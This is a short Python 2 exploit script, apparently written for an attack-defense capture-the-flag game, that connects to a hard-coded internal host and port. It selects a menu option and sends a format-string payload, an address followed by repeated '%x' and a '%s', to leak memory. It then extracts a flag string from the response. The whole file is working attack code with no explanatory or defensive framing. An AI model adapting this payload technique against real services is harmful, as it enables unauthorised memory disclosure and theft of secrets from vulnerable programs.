import sys

class Exploit():

    def execute(self,ip,port,flag_id):
        import re,socket,binascii
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        print "Elso: "+s.recv(4024)
        evil="\x41\xc1\x04\x08\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x78\x25\x73\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x45\x02\x02\x02\x02\x02\x02\x02\x02\xff\xff\x0a"
        #print binascii.hexlify(evil)
        s.send("1\n")
        print "Masodik: "+s.recv(4024)
        s.send(evil)
        r=s.recv(4024)
        #print binascii.hexlify(r)
        print repr(r)
        self.flag=re.search("(FLG[a-zA-Z0-9]{13})",r).group(0)
        

    def result(self):
        return {'FLAG' : self.flag }

e=Exploit()
#e.execute("10.105.0.54",8888,"")
e.execute("10.105.0.54",4444,"")

#10.13.37.49
print e.result()